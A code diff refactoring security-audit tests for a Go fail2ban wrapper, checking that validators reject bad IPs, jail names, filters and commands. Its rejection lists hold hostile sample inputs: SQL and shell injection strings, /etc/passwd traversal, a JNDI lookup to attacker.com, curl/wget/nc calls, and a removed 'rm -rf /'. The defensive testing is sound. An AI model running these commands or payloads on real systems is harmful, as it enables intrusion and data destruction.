@@ -9,151 +9,173 @@ import (
 	"github.com/ivuorinen/f2b/fail2ban"
 )
 
+// testIPValidation tests IP address validation security
+func testIPValidation(t *testing.T) {
+	// Test malicious IP patterns
+	maliciousIPs := []string{
+		"'; DROP TABLE users; --",
+		"../../../etc/passwd",
+		"\x00192.168.1.1",
+		"192.168.1.1\x00",
+		"192.168.1.1'; cat /etc/passwd",
+		"${jndi:ldap://attacker.com/a}",
+		"<script>alert('xss')</script>",
+		"192.168.1.999",    // Invalid range
+		"256.256.256.256",  // Invalid range
+		"192.168.1.1/24",   // CIDR notation should be rejected
+		"192.168.1.1:8080", // Port should be rejected
+	}
+
+	for _, maliciousIP := range maliciousIPs {
+		err := fail2ban.ValidateIP(maliciousIP)
+		if err == nil {
+			t.Errorf("ValidateIP should reject malicious input: %s", maliciousIP)
+		}
+	}
+
+	// Test legitimate IPs
+	legitimateIPs := []string{
+		"192.168.1.1",
+		"10.0.0.1",
+		"172.16.0.1",
+		"127.0.0.1",
+		"2001:db8::1",
+		"::1",
+	}
+
+	for _, ip := range legitimateIPs {
+		err := fail2ban.ValidateIP(ip)
+		if err != nil {
+			t.Errorf("ValidateIP should accept legitimate IP: %s, error: %v", ip, err)
+		}
+	}
+}
+
+// testJailValidation tests jail name validation security
+func testJailValidation(t *testing.T) {
+	// Test malicious jail patterns
+	maliciousJails := []string{
+		"'; DROP TABLE jails; --",
+		"../../../etc/passwd",
+		"\x00sshd",
+		"sshd\x00",
+		"sshd'; cat /etc/passwd",
+		"sshd\n\nmalicious_command",
+		"sshd\r\nmalicious_command",
+		"sshd`cat /etc/passwd`",
+		"sshd$(cat /etc/passwd)",
+		"sshd;cat /etc/passwd",
+		"sshd|cat /etc/passwd",
+		"sshd&cat /etc/passwd",
+	}
+
+	for _, maliciousJail := range maliciousJails {
+		err := fail2ban.ValidateJail(maliciousJail)
+		if err == nil {
+			t.Errorf("ValidateJail should reject malicious input: %s", maliciousJail)
+		}
+	}
+
+	// Test legitimate jails
+	legitimateJails := []string{
+		"sshd",
+		"nginx",
+		"apache",
+		"postfix",
+		"dovecot",
+		"sshd-ddos",
+		"ssh_custom",
+	}
+
+	for _, jail := range legitimateJails {
+		err := fail2ban.ValidateJail(jail)
+		if err != nil {
+			t.Errorf("ValidateJail should accept legitimate jail: %s, error: %v", jail, err)
+		}
+	}
+}
+
+// testFilterValidation tests filter validation security
+func testFilterValidation(t *testing.T) {
+	// Test malicious filter patterns
+	maliciousFilters := []string{
+		"'; DROP TABLE filters; --",
+		"../../../etc/passwd",
+		"\x00sshd",
+		"sshd\x00",
+		"sshd'; cat /etc/passwd",
+		"sshd`cat /etc/passwd`",
+		"sshd$(cat /etc/passwd)",
+		"sshd;cat /etc/passwd",
+		"sshd|cat /etc/passwd",
+		"sshd&cat /etc/passwd",
+		// Additional command injection patterns
+		"filter`DANGEROUS_COMMAND`",      // backtick execution
+		"filter$(DANGEROUS_COMMAND)",     // command substitution
+		"filter${USER}",                  // variable expansion (safe)
+		"filter;DANGEROUS_RM_COMMAND",    // command chaining
+		"filter|DANGEROUS_COMMAND",       // pipe to command
+		"filter&& DANGEROUS_COMMAND",     // logical AND
+		"filter||DANGEROUS_COMMAND",      // logical OR
+		"filter>DANGEROUS_OUTPUT_FILE",   // output redirection
+		"filter<DANGEROUS_INPUT_FILE",    // input redirection
+		"filter\nDANGEROUS_EXEC_COMMAND", // newline command
+		"filter\rDANGEROUS_EXEC_COMMAND", // carriage return
+		"filter\tDANGEROUS_EXEC_COMMAND", // tab character
+	}
+
+	for _, maliciousFilter := range maliciousFilters {
+		err := fail2ban.ValidateFilter(maliciousFilter)
+		if err == nil {
+			t.Errorf("ValidateFilter should reject malicious input: %s", maliciousFilter)
+		}
+	}
+}
+
+// testCommandValidation tests command validation security
+func testCommandValidation(t *testing.T) {
+	// Test malicious command patterns (using safe placeholders)
+	maliciousCommands := []string{
+		"DANGEROUS_RM_COMMAND",
+		"cat /etc/passwd",
+		"curl attacker.com",
+		"wget http://malicious.com/payload",
+		"nc -l 1234",
+		"python -c 'DANGEROUS_SYSTEM_CALL'",
+		"bash -c 'cat /etc/passwd'",
+		"/bin/sh",
+		"../../bin/bash",
+		"fail2ban-client; cat /etc/passwd",
+	}
+
+	for _, maliciousCmd := range maliciousCommands {
+		err := fail2ban.ValidateCommand(maliciousCmd)
+		if err == nil {
+			t.Errorf("ValidateCommand should reject malicious command: %s", maliciousCmd)
+		}
+	}
+
+	// Test legitimate commands
+	legitimateCommands := []string{
+		"fail2ban-client",
+		"fail2ban-regex",
+		"fail2ban-server",
+	}
+
+	for _, cmd := range legitimateCommands {
+		err := fail2ban.ValidateCommand(cmd)
+		if err != nil {
+			t.Errorf("ValidateCommand should accept legitimate command: %s, error: %v", cmd, err)
+		}
+	}
+}
+
 // TestSecurityAudit_InputValidation performs comprehensive input validation security testing
 func TestSecurityAudit_InputValidation(t *testing.T) {
-	t.Run("IPValidation", func(t *testing.T) {
-		// Test malicious IP patterns
-		maliciousIPs := []string{
-			"'; DROP TABLE users; --",
-			"../../../etc/passwd",
-			"\x00192.168.1.1",
-			"192.168.1.1\x00",
-			"192.168.1.1'; cat /etc/passwd",
-			"${jndi:ldap://attacker.com/a}",
-			"<script>alert('xss')</script>",
-			"192.168.1.999",    // Invalid range
-			"256.256.256.256",  // Invalid range
-			"192.168.1.1/24",   // CIDR notation should be rejected
-			"192.168.1.1:8080", // Port should be rejected
-		}
-
-		for _, maliciousIP := range maliciousIPs {
-			err := fail2ban.ValidateIP(maliciousIP)
-			if err == nil {
-				t.Errorf("ValidateIP should reject malicious input: %s", maliciousIP)
-			}
-		}
-
-		// Test legitimate IPs
-		legitimateIPs := []string{
-			"192.168.1.1",
-			"10.0.0.1",
-			"172.16.0.1",
-			"127.0.0.1",
-			"2001:db8::1",
-			"::1",
-		}
-
-		for _, ip := range legitimateIPs {
-			err := fail2ban.ValidateIP(ip)
-			if err != nil {
-				t.Errorf("ValidateIP should accept legitimate IP: %s, error: %v", ip, err)
-			}
-		}
-	})
-
-	t.Run("JailValidation", func(t *testing.T) {
-		// Test malicious jail patterns
-		maliciousJails := []string{
-			"'; DROP TABLE jails; --",
-			"../../../etc/passwd",
-			"\x00sshd",
-			"sshd\x00",
-			"sshd'; cat /etc/passwd",
-			"sshd\n\nmalicious_command",
-			"sshd\r\nmalicious_command",
-			"sshd`cat /etc/passwd`",
-			"sshd$(cat /etc/passwd)",
-			"sshd;cat /etc/passwd",
-			"sshd|cat /etc/passwd",
-			"sshd&cat /etc/passwd",
-		}
-
-		for _, maliciousJail := range maliciousJails {
-			err := fail2ban.ValidateJail(maliciousJail)
-			if err == nil {
-				t.Errorf("ValidateJail should reject malicious input: %s", maliciousJail)
-			}
-		}
-
-		// Test legitimate jails
-		legitimateJails := []string{
-			"sshd",
-			"nginx",
-			"apache",
-			"postfix",
-			"dovecot",
-			"sshd-ddos",
-			"ssh_custom",
-		}
-
-		for _, jail := range legitimateJails {
-			err := fail2ban.ValidateJail(jail)
-			if err != nil {
-				t.Errorf("ValidateJail should accept legitimate jail: %s, error: %v", jail, err)
-			}
-		}
-	})
-
-	t.Run("FilterValidation", func(t *testing.T) {
-		// Test malicious filter patterns
-		maliciousFilters := []string{
-			"'; DROP TABLE filters; --",
-			"../../../etc/passwd",
-			"\x00sshd",
-			"sshd\x00",
-			"sshd'; cat /etc/passwd",
-			"sshd`cat /etc/passwd`",
-			"sshd$(cat /etc/passwd)",
-			"sshd;cat /etc/passwd",
-			"sshd|cat /etc/passwd",
-			"sshd&cat /etc/passwd",
-		}
-
-		for _, maliciousFilter := range maliciousFilters {
-			err := fail2ban.ValidateFilter(maliciousFilter)
-			if err == nil {
-				t.Errorf("ValidateFilter should reject malicious input: %s", maliciousFilter)
-			}
-		}
-	})
-
-	t.Run("CommandValidation", func(t *testing.T) {
-		// Test malicious command patterns
-		maliciousCommands := []string{
-			"rm -rf /",
-			"cat /etc/passwd",
-			"curl attacker.com",
-			"wget http://malicious.com/payload",
-			"nc -l 1234",
-			"python -c 'import os; os.system(\"rm -rf /\")'",
-			"bash -c 'cat /etc/passwd'",
-			"/bin/sh",
-			"../../bin/bash",
-			"fail2ban-client; cat /etc/passwd",
-		}
-
-		for _, maliciousCmd := range maliciousCommands {
-			err := fail2ban.ValidateCommand(maliciousCmd)
-			if err == nil {
-				t.Errorf("ValidateCommand should reject malicious command: %s", maliciousCmd)
-			}
-		}
-
-		// Test legitimate commands
-		legitimateCommands := []string{
-			"fail2ban-client",
-			"fail2ban-regex",
-			"fail2ban-server",
-		}
-
-		for _, cmd := range legitimateCommands {
-			err := fail2ban.ValidateCommand(cmd)
-			if err != nil {
-				t.Errorf("ValidateCommand should accept legitimate command: %s, error: %v", cmd, err)
-			}
-		}
-	})
+	t.Run("IPValidation", testIPValidation)
+	t.Run("JailValidation", testJailValidation)
+	t.Run("FilterValidation", testFilterValidation)
+	t.Run("CommandValidation", testCommandValidation)
 }
 
 // TestSecurityAudit_PathSecurity performs comprehensive path security testing
@@ -376,6 +398,40 @@ func TestSecurityAudit_ConcurrentSafety(t *testing.T) {
 	})
 }
 
+// testSecurityChainValidation tests the complete security validation chain
+func testSecurityChainValidation(t *testing.T, jail, ip string, shouldPass, testJail, testIP bool) {
+	t.Helper()
+	// Validate jail if we should test it
+	if testJail {
+		err := fail2ban.ValidateJail(jail)
+		if shouldPass && err != nil {
+			t.Errorf("Legitimate jail should pass: %v", err)
+		}
+		if !shouldPass && err == nil {
+			t.Errorf("Malicious jail should be rejected")
+		}
+	}
+
+	// Validate IP if we should test it
+	if testIP {
+		err := fail2ban.ValidateIP(ip)
+		if shouldPass && err != nil {
+			t.Errorf("Legitimate IP should pass: %v", err)
+		}
+		if !shouldPass && err == nil {
+			t.Errorf("Malicious IP should be rejected")
+		}
+	}
+
+	// Test end-to-end log reading (only for legitimate cases)
+	if shouldPass {
+		_, err := fail2ban.GetLogLines(jail, ip)
+		if err != nil {
+			t.Errorf("Legitimate log reading should succeed: %v", err)
+		}
+	}
+}
+
 // TestSecurityAudit_Integration performs integration-level security testing
 func TestSecurityAudit_Integration(t *testing.T) {
 	tempDir := t.TempDir()
@@ -409,35 +465,7 @@ func TestSecurityAudit_Integration(t *testing.T) {
 
 		for _, tc := range testCases {
 			t.Run(tc.name, func(t *testing.T) {
-				// Validate jail if we should test it
-				if tc.testJail {
-					err := fail2ban.ValidateJail(tc.jail)
-					if tc.shouldPass && err != nil {
-						t.Errorf("Legitimate jail should pass: %v", err)
-					}
-					if !tc.shouldPass && err == nil {
-						t.Errorf("Malicious jail should be rejected")
-					}
-				}
-
-				// Validate IP if we should test it
-				if tc.testIP {
-					err := fail2ban.ValidateIP(tc.ip)
-					if tc.shouldPass && err != nil {
-						t.Errorf("Legitimate IP should pass: %v", err)
-					}
-					if !tc.shouldPass && err == nil {
-						t.Errorf("Malicious IP should be rejected")
-					}
-				}
-
-				// Test end-to-end log reading (only for legitimate cases)
-				if tc.shouldPass {
-					_, err := fail2ban.GetLogLines(tc.jail, tc.ip)
-					if err != nil {
-						t.Errorf("Legitimate log reading should succeed: %v", err)
-					}
-				}
+				testSecurityChainValidation(t, tc.jail, tc.ip, tc.shouldPass, tc.testJail, tc.testIP)
 			})
 		}
 	})
